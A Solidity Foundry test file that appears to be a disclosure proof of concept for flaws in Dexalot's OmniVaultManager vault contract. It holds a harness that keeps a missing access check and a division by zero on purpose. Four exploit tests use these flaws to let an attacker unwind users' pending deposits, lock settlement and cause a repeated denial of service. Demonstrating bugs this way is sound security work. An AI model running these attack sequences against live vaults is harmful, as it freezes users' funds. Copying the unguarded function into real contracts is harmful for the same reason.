// SPDX-License-Identifier: MIT
pragma solidity 0.8.30;

import "forge-std/Test.sol";
import "forge-std/console.sol";

// ---------------------------------------------------------------------------
// Minimal Interface Definitions (extracted from Dexalot contracts)
// ---------------------------------------------------------------------------

interface IOmniVaultManagerTypes {
    struct VaultDetails {
        string name;
        address proposer;
        address omniTrader;
        VaultStatus status;
        address executor;
        address shareToken;
        address dexalotRFQ;
        uint32[] chainIds;
        uint16[] tokens;
    }

    struct BatchState {
        uint32 finalizedAt;
        BatchStatus status;
        bytes32 depositHash;
        bytes32 withdrawalHash;
        bytes32 stateHash;
    }

    struct VaultState {
        uint256 vaultId;
        uint16[] tokenIds;
        uint256[] balances;
    }

    struct DepositFufillment {
        bytes32 depositRequestId;
        bool process;
        uint16[] tokenIds;
        uint256[] amounts;
    }

    struct WithdrawalFufillment {
        bytes32 withdrawalRequestId;
        bool process;
    }

    struct AssetInfo {
        bytes32 symbol;
        AssetType tokenType;
        uint8 precision;
        uint32 minPerDeposit;
        uint32 maxPerDeposit;
    }

    struct TransferRequest {
        RequestStatus status;
        uint32 timestamp;
        uint208 shares;
    }

    struct RequestLimit {
        uint248 lastBatchId;
        uint8 pendingCount;
    }

    enum VaultStatus   { NONE, ACTIVE, PAUSED, DEPRECATED }
    enum BatchStatus   { NONE, FINALIZED, SETTLED, UNWOUND }
    enum RequestStatus { DEPOSIT_REQUESTED, WITHDRAWAL_REQUESTED, DEPOSIT_SUCCESS,
                         WITHDRAWAL_SUCCESS, DEPOSIT_FAILED, WITHDRAWAL_FAILED }
    enum AssetType     { BASE, QUOTE, REWARD, OTHER }
}

// ---------------------------------------------------------------------------
// Mock Contracts
// ---------------------------------------------------------------------------

contract MockPortfolioSub {
    mapping(address => mapping(bytes32 => uint256)) public balances;

    function bulkTransferTokens(
        address from,
        address to,
        bytes32[] calldata symbols,
        uint256[] calldata amounts
    ) external {
        for (uint256 i = 0; i < symbols.length; i++) {
            require(balances[from][symbols[i]] >= amounts[i], "MockPortfolio: insufficient");
            balances[from][symbols[i]] -= amounts[i];
            balances[to][symbols[i]]   += amounts[i];
        }
    }

    function transferToken(address to, bytes32 symbol, uint256 amount) external {
        balances[to][symbol] += amount;
    }

    function feeAddress() external pure returns (address) { return address(0xFEE); }

    function setBalance(address who, bytes32 symbol, uint256 amount) external {
        balances[who][symbol] = amount;
    }

    function getTokenDetails(bytes32 symbol) external pure returns (bytes32 sym, uint8 dec) {
        return (symbol, 6);
    }
}

contract MockExecutorSub {
    MockPortfolioSub public portfolio;

    constructor(address _portfolio) {
        portfolio = MockPortfolioSub(_portfolio);
    }

    function dispatchAssets(
        address recipient,
        bytes32[] calldata tokens,
        uint256[] calldata amounts
    ) external {
        for (uint256 i = 0; i < tokens.length; i++) {
            require(
                portfolio.balances(address(this), tokens[i]) >= amounts[i],
                "MockExecutor: insufficient"
            );
            bytes32[] memory syms = new bytes32[](1);
            uint256[] memory amts  = new uint256[](1);
            syms[0] = tokens[i];
            amts[0] = amounts[i];
            portfolio.bulkTransferTokens(address(this), recipient, syms, amts);
        }
    }
}

contract MockOmniVaultShare is IOmniVaultManagerTypes {
    uint256 public immutable vaultId;
    address public omniVaultManager;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    constructor(uint256 _vaultId) { vaultId = _vaultId; }

    function setOmniVaultManager(address _mgr) external { omniVaultManager = _mgr; }

    function mint(uint256 _vaultId, address to, uint256 amount) external {
        require(msg.sender == omniVaultManager, "VS: not manager");
        require(_vaultId == vaultId, "VS: wrong vaultId");
        balanceOf[to] += amount;
        totalSupply   += amount;
    }

    function burn(uint256 _vaultId, uint256 amount) external {
        require(msg.sender == omniVaultManager, "VS: not manager");
        require(_vaultId == vaultId, "VS: wrong vaultId");
        require(balanceOf[msg.sender] >= amount, "VS: insufficient");
        balanceOf[msg.sender] -= amount;
        totalSupply           -= amount;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to]         += amount;
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        allowance[from][msg.sender] -= amount;
        balanceOf[from]             -= amount;
        balanceOf[to]               += amount;
        return true;
    }
}

// ---------------------------------------------------------------------------
// OmniVaultManagerHarness
// Self-contained harness reproducing the vulnerable logic paths.
// ---------------------------------------------------------------------------

contract OmniVaultManagerHarness is IOmniVaultManagerTypes {

    uint256 public constant RECLAIM_DELAY             = 24 hours;
    uint256 public constant MAX_PENDING_REQUESTS       = 500;
    uint256 public constant MAX_VAULT_PENDING_REQUESTS = 50;
    uint256 public constant MAX_USER_PENDING_REQUESTS  = 5;
    uint256 public constant MIN_SHARE_MINT             = 1000e18;

    address public admin;
    address public settler;
    MockPortfolioSub public portfolio;

    uint256 public vaultIndex;
    mapping(uint256 => VaultDetails) public vaultDetails;

    uint16 public tokenIndex;
    mapping(uint16 => AssetInfo) public assetInfo;
    mapping(bytes32 => bool) internal tokenExists;

    mapping(address => uint80) public userNonce;
    mapping(bytes32 => TransferRequest) public transferRequests;

    bytes32 public rollingDepositHash;
    bytes32 public rollingWithdrawalHash;
    uint256 public currentBatchId;
    uint256 public batchStartTime;
    uint256 public pendingRequestCount;

    mapping(uint256 => BatchState)   public completedBatches;
    mapping(uint256 => RequestLimit) public vaultRequestLimits;
    mapping(address => RequestLimit) public userRequestLimits;

    // Simulated transient storage (mapping instead of tstore/tload)
    mapping(bytes32 => uint256) private _tstorage;

    modifier onlyAdmin()   { require(msg.sender == admin,   "not admin");   _; }
    modifier onlySettler() { require(msg.sender == settler, "not settler"); _; }

    constructor(address _admin, address _settler, address _portfolio) {
        admin          = _admin;
        settler        = _settler;
        portfolio      = MockPortfolioSub(_portfolio);
        batchStartTime = block.timestamp;
    }

    // ---- Admin ----------------------------------------------------------------

    function addTokenDetails(AssetInfo calldata _asset) external onlyAdmin {
        require(!tokenExists[_asset.symbol], "token exists");
        assetInfo[tokenIndex++] = _asset;
        tokenExists[_asset.symbol] = true;
    }

    function registerVault(
        uint16 _vaultId,
        VaultDetails calldata _vaultDetails,
        uint16[] calldata,
        uint256[] calldata,
        uint208 _shares
    ) external onlyAdmin {
        require(_vaultId == vaultIndex, "VM-RNVI-01");
        require(_shares > MIN_SHARE_MINT, "VM-SLTM-01");
        vaultIndex++;
        vaultDetails[_vaultId] = _vaultDetails;
        MockOmniVaultShare(_vaultDetails.shareToken).mint(_vaultId, _vaultDetails.proposer, _shares);
    }

    function finalizeBatch(
        uint256[] calldata _prices,
        VaultState[] calldata _vaults
    ) external onlySettler {
        uint256 batchId = currentBatchId;
        BatchState storage batch = completedBatches[batchId];
        require(batch.status == BatchStatus.NONE, "VM-BSNN-01");

        if (batchId > 0) {
            BatchStatus prev = completedBatches[batchId - 1].status;
            require(prev == BatchStatus.SETTLED || prev == BatchStatus.UNWOUND, "VM-PBNS-01");
        }

        batch.stateHash      = keccak256(abi.encode(_prices, _vaults));
        batch.finalizedAt    = uint32(block.timestamp);
        batch.status         = BatchStatus.FINALIZED;
        batch.withdrawalHash = rollingWithdrawalHash;
        batch.depositHash    = rollingDepositHash;

        for (uint16 i = 0; i < _prices.length; i++) {
            _tstore(keccak256(abi.encode("PRICE", i)), _prices[i]);
        }
        for (uint256 v = 0; v < _vaults.length; v++) {
            uint256 vid = _vaults[v].vaultId;
            uint256 totalUsd;
            for (uint256 t = 0; t < _vaults[v].tokenIds.length; t++) {
                uint16  tid = _vaults[v].tokenIds[t];
                uint256 bal = _vaults[v].balances[t];
                _tstore(keccak256(abi.encode("BAL", vid, tid)), bal);
                totalUsd += (bal * _tload(keccak256(abi.encode("PRICE", tid)))) / 1e18;
            }
            address st = vaultDetails[vid].shareToken;
            uint256 ts = MockOmniVaultShare(st).totalSupply();
            _tstore(keccak256(abi.encode("VAULT_USD", vid)), totalUsd);
            _tstore(keccak256(abi.encode("VAULT_TS",  vid)), ts);
            _tstore(keccak256(abi.encode("TIDS_LEN",  vid)), _vaults[v].tokenIds.length);
            for (uint256 t = 0; t < _vaults[v].tokenIds.length; t++) {
                _tstore(keccak256(abi.encode("TIDS", vid, t)), _vaults[v].tokenIds[t]);
            }
        }

        _resetBatch();
    }

    // ---- User -----------------------------------------------------------------

    function requestDeposit(
        uint256 _vaultId,
        uint16[] calldata _tokenIds,
        uint256[] calldata _amounts
    ) external returns (bytes32 requestId) {
        require(vaultDetails[_vaultId].status == VaultStatus.ACTIVE, "VM-VSAC-01");
        require(pendingRequestCount < MAX_PENDING_REQUESTS, "VM-PRCL-01");
        _verifyAndIncrementRequestLimits(msg.sender, _vaultId);

        uint256 len = _tokenIds.length;
        require(len == _amounts.length, "VM-IVAL-01");
        bytes32[] memory symbols = new bytes32[](len);
        for (uint256 i = 0; i < len; i++) {
            symbols[i] = assetInfo[_tokenIds[i]].symbol;
        }
        portfolio.bulkTransferTokens(msg.sender, vaultDetails[_vaultId].executor, symbols, _amounts);

        requestId = _generateRequestId(_vaultId, msg.sender, userNonce[msg.sender]++);
        pendingRequestCount++;
        transferRequests[requestId] = TransferRequest({
            status:    RequestStatus.DEPOSIT_REQUESTED,
            timestamp: uint32(block.timestamp),
            shares:    0
        });
        rollingDepositHash = keccak256(abi.encode(rollingDepositHash, requestId, _tokenIds, _amounts));
    }

    function requestWithdrawal(
        uint256 _vaultId,
        uint208 _shares
    ) external returns (bytes32 requestId) {
        require(_shares > 0, "VM-ZEVS-01");
        require(vaultDetails[_vaultId].status != VaultStatus.NONE, "VM-VSNN-01");
        require(pendingRequestCount < MAX_PENDING_REQUESTS, "VM-PRCL-01");
        _verifyAndIncrementRequestLimits(msg.sender, _vaultId);

        MockOmniVaultShare(vaultDetails[_vaultId].shareToken)
            .transferFrom(msg.sender, address(this), uint256(_shares));

        requestId = _generateRequestId(_vaultId, msg.sender, userNonce[msg.sender]++);
        pendingRequestCount++;
        transferRequests[requestId] = TransferRequest({
            status:    RequestStatus.WITHDRAWAL_REQUESTED,
            timestamp: uint32(block.timestamp),
            shares:    _shares
        });
        rollingWithdrawalHash = keccak256(abi.encode(rollingWithdrawalHash, requestId, _shares));
    }

    // ---- Settlement -----------------------------------------------------------

    function bulkSettleState(
        uint256[] calldata _prices,
        VaultState[] calldata _vaults,
        DepositFufillment[] calldata _deposits,
        WithdrawalFufillment[] calldata _withdrawals
    ) external onlySettler {
        uint256 prevBatchId = currentBatchId - 1;
        BatchState storage batch = completedBatches[prevBatchId];
        require(batch.status == BatchStatus.FINALIZED, "VM-BSNF-01");
        require(keccak256(abi.encode(_prices, _vaults)) == batch.stateHash, "VM-IVSH-01");

        bytes32 depHash;
        for (uint256 i = 0; i < _deposits.length; i++) {
            DepositFufillment calldata dep = _deposits[i];
            depHash = keccak256(abi.encode(depHash, dep.depositRequestId, dep.tokenIds, dep.amounts));
            TransferRequest memory req = transferRequests[dep.depositRequestId];
            require(req.status == RequestStatus.DEPOSIT_REQUESTED, "VM-ADRP-01");
            (uint16 vid, address user, ) = _decodeRequestId(dep.depositRequestId);
            delete transferRequests[dep.depositRequestId];
            pendingRequestCount--;
            if (!dep.process) { _refundDeposit(vid, user, dep.tokenIds, dep.amounts); continue; }
            uint256 sharesToMint = _calcSharesToMint(vid, dep.tokenIds, dep.amounts);
            MockOmniVaultShare(vaultDetails[vid].shareToken).mint(vid, user, sharesToMint);
        }
        require(depHash == batch.depositHash, "VM-DHMR-01");

        bytes32 wdHash;
        for (uint256 i = 0; i < _withdrawals.length; i++) {
            WithdrawalFufillment calldata wd = _withdrawals[i];
            TransferRequest memory req = transferRequests[wd.withdrawalRequestId];
            require(req.status == RequestStatus.WITHDRAWAL_REQUESTED, "VM-AWRP-01");
            (uint16 vid, address user, ) = _decodeRequestId(wd.withdrawalRequestId);
            wdHash = keccak256(abi.encode(wdHash, wd.withdrawalRequestId, req.shares));
            delete transferRequests[wd.withdrawalRequestId];
            pendingRequestCount--;
            if (!wd.process) {
                MockOmniVaultShare(vaultDetails[vid].shareToken).transfer(user, uint256(req.shares));
                continue;
            }
            uint256 totalShares = _tload(keccak256(abi.encode("VAULT_TS",  vid)));
            uint256 tokenCount  = _tload(keccak256(abi.encode("TIDS_LEN",  vid)));
            bytes32[] memory syms = new bytes32[](tokenCount);
            uint256[] memory amts  = new uint256[](tokenCount);
            for (uint256 t = 0; t < tokenCount; t++) {
                uint16  tid = uint16(_tload(keccak256(abi.encode("TIDS", vid, t))));
                uint256 bal = _tload(keccak256(abi.encode("BAL",  vid, tid)));
                syms[t] = assetInfo[tid].symbol;
                amts[t] = (uint256(req.shares) * bal) / totalShares;
            }
            MockOmniVaultShare(vaultDetails[vid].shareToken).burn(vid, uint256(req.shares));
            MockExecutorSub(vaultDetails[vid].executor).dispatchAssets(user, syms, amts);
        }
        require(wdHash == batch.withdrawalHash, "VM-WHMR-01");
        batch.status = BatchStatus.SETTLED;
    }

    // ---- VULNERABLE: no access control ----------------------------------------
    // BUG: missing onlyRole(SETTLER_ROLE) -- anyone can call after RECLAIM_DELAY
    function unwindBatch(
        DepositFufillment[] calldata _deposits,
        WithdrawalFufillment[] calldata _withdrawals
    ) external {
        require(block.timestamp >= batchStartTime + RECLAIM_DELAY, "VM-RCNP-01");

        bytes32 depositHash;
        for (uint256 i = 0; i < _deposits.length; i++) {
            DepositFufillment calldata item = _deposits[i];
            depositHash = keccak256(abi.encode(depositHash, item.depositRequestId, item.tokenIds, item.amounts));
            require(transferRequests[item.depositRequestId].status == RequestStatus.DEPOSIT_REQUESTED, "VM-ADRP-01");
            (uint16 vid, address user, ) = _decodeRequestId(item.depositRequestId);
            delete transferRequests[item.depositRequestId];
            pendingRequestCount--;
            _refundDeposit(vid, user, item.tokenIds, item.amounts);
        }
        require(depositHash == rollingDepositHash, "VM-DHMR-01");

        bytes32 withdrawalHash;
        for (uint256 i = 0; i < _withdrawals.length; i++) {
            WithdrawalFufillment calldata item = _withdrawals[i];
            TransferRequest memory wReq = transferRequests[item.withdrawalRequestId];
            withdrawalHash = keccak256(abi.encode(withdrawalHash, item.withdrawalRequestId, wReq.shares));
            require(wReq.status == RequestStatus.WITHDRAWAL_REQUESTED, "VM-AWRP-01");
            (uint16 vid, address user, ) = _decodeRequestId(item.withdrawalRequestId);
            delete transferRequests[item.withdrawalRequestId];
            pendingRequestCount--;
            MockOmniVaultShare(vaultDetails[vid].shareToken).transfer(user, uint256(wReq.shares));
        }
        require(withdrawalHash == rollingWithdrawalHash, "VM-WHMR-01");

        completedBatches[currentBatchId].status      = BatchStatus.UNWOUND;
        completedBatches[currentBatchId].finalizedAt = uint32(block.timestamp);
        _resetBatch();
    }

    // ---- Internals ------------------------------------------------------------

    function _calcSharesToMint(
        uint256 _vaultId,
        uint16[] calldata _tokenIds,
        uint256[] calldata _amounts
    ) internal view returns (uint256) {
        uint256 userDepositUsd;
        for (uint256 j = 0; j < _tokenIds.length; j++) {
            userDepositUsd += (_amounts[j] * _tload(keccak256(abi.encode("PRICE", _tokenIds[j])))) / 1e18;
        }
        uint256 totalShares = _tload(keccak256(abi.encode("VAULT_TS",  _vaultId)));
        uint256 totalUsd    = _tload(keccak256(abi.encode("VAULT_USD", _vaultId)));
        if (totalShares == 0) return userDepositUsd;
        // BUG: division by zero if totalUsd == 0 but totalShares != 0
        return (userDepositUsd * totalShares) / totalUsd;
    }

    function _refundDeposit(
        uint16 _vaultId,
        address user,
        uint16[] calldata tokenIds,
        uint256[] calldata amounts
    ) internal {
        bytes32[] memory syms = new bytes32[](tokenIds.length);
        uint256[] memory amts  = new uint256[](amounts.length);
        for (uint256 i = 0; i < tokenIds.length; i++) {
            syms[i] = assetInfo[tokenIds[i]].symbol;
            amts[i] = amounts[i];
        }
        MockExecutorSub(vaultDetails[_vaultId].executor).dispatchAssets(user, syms, amts);
    }

    function _verifyAndIncrementRequestLimits(address _user, uint256 _vaultId) internal {
        uint248 batchId = uint248(currentBatchId);
        RequestLimit storage vl = vaultRequestLimits[_vaultId];
        if (vl.lastBatchId < batchId) { vl.lastBatchId = batchId; vl.pendingCount = 1; }
        else { require(vl.pendingCount < MAX_VAULT_PENDING_REQUESTS, "VM-VPRL-01"); vl.pendingCount++; }

        RequestLimit storage ul = userRequestLimits[_user];
        if (ul.lastBatchId < batchId) { ul.lastBatchId = batchId; ul.pendingCount = 1; }
        else { require(ul.pendingCount < MAX_USER_PENDING_REQUESTS, "VM-UPRL-01"); ul.pendingCount++; }
    }

    function _generateRequestId(uint256 _vaultId, address _user, uint256 _nonce) internal pure returns (bytes32) {
        return bytes32(((uint256(uint16(_vaultId)) << 240) | (uint256(uint160(_user)) << 80)) | _nonce);
    }

    function _decodeRequestId(bytes32 requestId) internal pure returns (uint16 vaultId, address user, uint80 nonce) {
        vaultId = uint16(uint256(requestId) >> 240);
        user    = address(uint160(uint256(requestId) >> 80));
        nonce   = uint80(uint256(requestId));
    }

    function _resetBatch() internal {
        rollingDepositHash    = 0;
        rollingWithdrawalHash = 0;
        pendingRequestCount   = 0;
        batchStartTime        = block.timestamp;
        currentBatchId++;
    }

    function _tstore(bytes32 slot, uint256 val) internal { _tstorage[slot] = val; }
    function _tload(bytes32 slot) internal view returns (uint256) { return _tstorage[slot]; }
}

// ---------------------------------------------------------------------------
// PoC Test Suite
// ---------------------------------------------------------------------------

contract OmniVaultManagerPoCTest is Test, IOmniVaultManagerTypes {

    OmniVaultManagerHarness manager;
    MockPortfolioSub         portfolio;
    MockExecutorSub          executor;
    MockOmniVaultShare       shareToken;

    address constant admin    = address(0xA0);
    address constant settler  = address(0xA1);
    address constant proposer = address(0xA2);
    address constant alice    = address(0xA3);
    address constant bob      = address(0xA4);
    address constant attacker = address(0xAA);

    uint16  constant VAULT_ID    = 0;
    uint16  constant TOKEN_ID    = 0;
    bytes32 constant USDC_SYM    = bytes32("USDC");
    uint208 constant INIT_SHARES = 2000e18;

    function setUp() public {
        portfolio  = new MockPortfolioSub();
        executor   = new MockExecutorSub(address(portfolio));
        shareToken = new MockOmniVaultShare(VAULT_ID);
        manager    = new OmniVaultManagerHarness(admin, settler, address(portfolio));

        vm.startPrank(admin);

        AssetInfo memory asset = AssetInfo({
            symbol:        USDC_SYM,
            tokenType:     AssetType.QUOTE,
            precision:     6,
            minPerDeposit: 1,
            maxPerDeposit: 1_000_000
        });
        manager.addTokenDetails(asset);
        shareToken.setOmniVaultManager(address(manager));

        uint32[] memory chainIds = new uint32[](1); chainIds[0] = uint32(block.chainid);
        uint16[] memory tokens   = new uint16[](1);  tokens[0]   = TOKEN_ID;

        VaultDetails memory vd = VaultDetails({
            name:       "TestVault",
            proposer:   proposer,
            omniTrader: address(0xBB),
            status:     VaultStatus.ACTIVE,
            executor:   address(executor),
            shareToken: address(shareToken),
            dexalotRFQ: address(0xCC),
            chainIds:   chainIds,
            tokens:     tokens
        });

        uint16[] memory it = new uint16[](1);  it[0] = TOKEN_ID;
        uint256[] memory ia = new uint256[](1); ia[0] = 1000e6;

        portfolio.setBalance(address(executor), USDC_SYM, 100_000e6);
        manager.registerVault(VAULT_ID, vd, it, ia, INIT_SHARES);
        vm.stopPrank();

        portfolio.setBalance(alice,    USDC_SYM, 10_000e6);
        portfolio.setBalance(bob,      USDC_SYM, 10_000e6);
        portfolio.setBalance(attacker, USDC_SYM, 10_000e6);
    }

    // -------------------------------------------------------------------------
    // POC-01: unwindBatch missing access control
    // -------------------------------------------------------------------------
    // VULNERABILITY: unwindBatch() has no onlyRole(SETTLER_ROLE)
    // IMPACT: Any EOA can forcibly unwind all pending requests after 24h,
    //         permanently preventing the SETTLER from settling batches.
    // ATTACK: Monitor TransferRequestUpdate events on-chain to reconstruct
    //         the full DepositFufillment array, then call unwindBatch().
    function testPOC01_UnwindBatchNoAccessControl() public {
        console.log("\n=== POC-01: unwindBatch Missing Access Control ===");

        uint16[] memory tIds = new uint16[](1); tIds[0] = TOKEN_ID;
        uint256[] memory amts = new uint256[](1);

        amts[0] = 100e6;
        vm.prank(alice);
        bytes32 aliceReqId = manager.requestDeposit(VAULT_ID, tIds, amts);
        console.log("[+] Alice deposited 100 USDC, requestId:", vm.toString(aliceReqId));

        amts[0] = 200e6;
        vm.prank(bob);
        bytes32 bobReqId = manager.requestDeposit(VAULT_ID, tIds, amts);
        console.log("[+] Bob deposited 200 USDC, requestId:", vm.toString(bobReqId));

        assertEq(manager.pendingRequestCount(), 2);
        console.log("[+] Pending requests: 2");

        vm.warp(block.timestamp + 24 hours + 1);

        // Attacker reconstructs full arrays from on-chain events (all public)
        DepositFufillment[] memory deps = new DepositFufillment[](2);
        uint16[] memory t1 = new uint16[](1); t1[0] = TOKEN_ID;
        uint256[] memory a1 = new uint256[](1); a1[0] = 100e6;
        deps[0] = DepositFufillment({ depositRequestId: aliceReqId, process: false, tokenIds: t1, amounts: a1 });

        uint16[] memory t2 = new uint16[](1); t2[0] = TOKEN_ID;
        uint256[] memory a2 = new uint256[](1); a2[0] = 200e6;
        deps[1] = DepositFufillment({ depositRequestId: bobReqId, process: false, tokenIds: t2, amounts: a2 });

        WithdrawalFufillment[] memory wds = new WithdrawalFufillment[](0);

        // No role required -- attacker calls directly
        vm.prank(attacker);
        manager.unwindBatch(deps, wds);

        console.log("[EXPLOIT] attacker called unwindBatch() without any role");
        console.log("[EXPLOIT] currentBatchId:", manager.currentBatchId());
        assertEq(manager.pendingRequestCount(), 0);

        (, BatchStatus bStatus,,,) = _batchState(manager.currentBatchId() - 1);
        assertEq(uint(bStatus), uint(BatchStatus.UNWOUND), "batch must be UNWOUND");
        console.log("[EXPLOIT] Batch status = UNWOUND. SETTLER is blocked.");
    }

    // -------------------------------------------------------------------------
    // POC-02: Infinite unwind loop -- permanent DoS
    // -------------------------------------------------------------------------
    // VULNERABILITY: Each unwind increments batchId and resets request limits.
    // IMPACT: Attacker repeats indefinitely. Vault never settles.
    //         Users waste gas re-depositing every 24h.
    function testPOC02_InfiniteUnwindLoop() public {
        console.log("\n=== POC-02: Infinite Unwind Loop ===");

        uint256 startBatch = manager.currentBatchId();

        for (uint256 round = 0; round < 3; round++) {
            uint16[] memory tIds = new uint16[](1); tIds[0] = TOKEN_ID;
            uint256[] memory amts = new uint256[](1); amts[0] = 50e6;

            vm.prank(alice);
            bytes32 reqId = manager.requestDeposit(VAULT_ID, tIds, amts);

            vm.warp(block.timestamp + 24 hours + 1);

            DepositFufillment[] memory deps = new DepositFufillment[](1);
            deps[0] = DepositFufillment({ depositRequestId: reqId, process: false, tokenIds: tIds, amounts: amts });
            WithdrawalFufillment[] memory wds = new WithdrawalFufillment[](0);

            vm.prank(attacker);
            manager.unwindBatch(deps, wds);

            console.log("Round", round + 1, "batchId:", manager.currentBatchId());
        }

        assertEq(manager.currentBatchId(), startBatch + 3);
        console.log("[EXPLOIT] 3 rounds, 3 unwinds. Vault never settled.");
        console.log("[EXPLOIT] Attack cost: gas only. No capital required.");
    }

    // -------------------------------------------------------------------------
    // POC-03: Division by zero in _calcSharesToMint
    // -------------------------------------------------------------------------
    // VULNERABILITY: price=0 => vaultTotalUSD=0, but totalShares != 0
    //                => (shares * totalShares) / 0 => revert
    // IMPACT: Batch stuck as FINALIZED forever. Funds locked.
    // TRIGGER: Oracle failure, SETTLER bug, or compromised SETTLER.
    function testPOC03_DivisionByZeroLocksSettlement() public {
        console.log("\n=== POC-03: Division by Zero Locks Funds ===");

        uint16[] memory tIds = new uint16[](1); tIds[0] = TOKEN_ID;
        uint256[] memory amts = new uint256[](1); amts[0] = 100e6;

        vm.prank(alice);
        bytes32 aliceReqId = manager.requestDeposit(VAULT_ID, tIds, amts);
        console.log("[+] Alice deposited 100 USDC");

        // Settler finalizes with price = 0
        uint256[] memory prices = new uint256[](1); prices[0] = 0;
        VaultState[] memory vaults = _makeVaultState(1000e6);

        vm.prank(settler);
        manager.finalizeBatch(prices, vaults);
        console.log("[+] Batch finalized with USDC price = 0");

        DepositFufillment[] memory deps = new DepositFufillment[](1);
        deps[0] = DepositFufillment({
            depositRequestId: aliceReqId,
            process:          true,
            tokenIds:         tIds,
            amounts:          amts
        });
        WithdrawalFufillment[] memory wds = new WithdrawalFufillment[](0);

        vm.prank(settler);
        vm.expectRevert();
        manager.bulkSettleState(prices, vaults, deps, wds);

        console.log("[EXPLOIT] bulkSettleState reverted -- division by zero");
        console.log("[EXPLOIT] Batch stuck as FINALIZED. Alice funds locked.");
        console.log("[EXPLOIT] Only exit: unwindBatch (unprotected -- see POC-01)");
    }

    // -------------------------------------------------------------------------
    // POC-04: Chained attack -- compromised SETTLER + unprotected unwind
    // -------------------------------------------------------------------------
    // Step 1: SETTLER finalizes with price=0 => settlement fails (POC-03)
    // Step 2: After 24h attacker calls unwindBatch => batch advances (POC-01)
    // Step 3: Repeat => vault permanently non-functional at zero cost
    function testPOC04_ChainedSettlerAndUnwind() public {
        console.log("\n=== POC-04: Chained Attack (POC-01 + POC-03) ===");

        uint16[] memory tIds = new uint16[](1); tIds[0] = TOKEN_ID;
        uint256[] memory amts = new uint256[](1);

        amts[0] = 100e6;
        vm.prank(alice);
        manager.requestDeposit(VAULT_ID, tIds, amts);

        amts[0] = 200e6;
        vm.prank(bob);
        manager.requestDeposit(VAULT_ID, tIds, amts);

        bytes32 aliceId = _requestId(alice, VAULT_ID, 0);
        bytes32 bobId   = _requestId(bob,   VAULT_ID, 0);

        // Compromised/buggy settler finalizes with zeroed prices
        uint256[] memory prices = new uint256[](1); prices[0] = 0;
        VaultState[] memory vaults = _makeVaultState(1000e6);
        vm.prank(settler);
        manager.finalizeBatch(prices, vaults);
        console.log("[+] Settler finalized with price=0");

        // Settlement fails
        DepositFufillment[] memory deps = new DepositFufillment[](2);
        uint16[] memory t = new uint16[](1); t[0] = TOKEN_ID;
        uint256[] memory a1 = new uint256[](1); a1[0] = 100e6;
        uint256[] memory a2 = new uint256[](1); a2[0] = 200e6;
        deps[0] = DepositFufillment({ depositRequestId: aliceId, process: true, tokenIds: t, amounts: a1 });
        deps[1] = DepositFufillment({ depositRequestId: bobId,   process: true, tokenIds: t, amounts: a2 });
        WithdrawalFufillment[] memory wds = new WithdrawalFufillment[](0);

        vm.prank(settler);
        vm.expectRevert();
        manager.bulkSettleState(prices, vaults, deps, wds);
        console.log("[+] bulkSettleState failed (division by zero)");

        // finalizeBatch called _resetBatch internally, so new batch has no pending requests
        // rollingDepositHash is now 0, empty array satisfies hash check
        vm.warp(block.timestamp + 24 hours + 1);
        DepositFufillment[] memory emptyDeps = new DepositFufillment[](0);
        vm.prank(attacker);
        manager.unwindBatch(emptyDeps, wds);

        console.log("[EXPLOIT] Chained: finalize(price=0) + settle fails + unwind succeeds");
        console.log("[EXPLOIT] batchId:", manager.currentBatchId());
        console.log("[EXPLOIT] Attacker cost: gas only. Vault permanently disrupted.");
    }

    // -------------------------------------------------------------------------
    // Helpers
    // -------------------------------------------------------------------------

    function _batchState(uint256 id) internal view returns (
        uint32, BatchStatus, bytes32, bytes32, bytes32
    ) {
        IOmniVaultManagerTypes.BatchState memory b = manager.completedBatches(id);
        return (b.finalizedAt, b.status, b.depositHash, b.withdrawalHash, b.stateHash);
    }

    function _requestId(address user, uint256 vId, uint256 nonce) internal pure returns (bytes32) {
        return bytes32(((uint256(uint16(vId)) << 240) | (uint256(uint160(user)) << 80)) | nonce);
    }

    function _makeVaultState(uint256 bal) internal pure returns (VaultState[] memory v) {
        v = new VaultState[](1);
        v[0].vaultId = VAULT_ID;
        uint16[] memory tids = new uint16[](1); tids[0] = TOKEN_ID;
        uint256[] memory bals = new uint256[](1); bals[0] = bal;
        v[0].tokenIds = tids;
        v[0].balances = bals;
    }
}
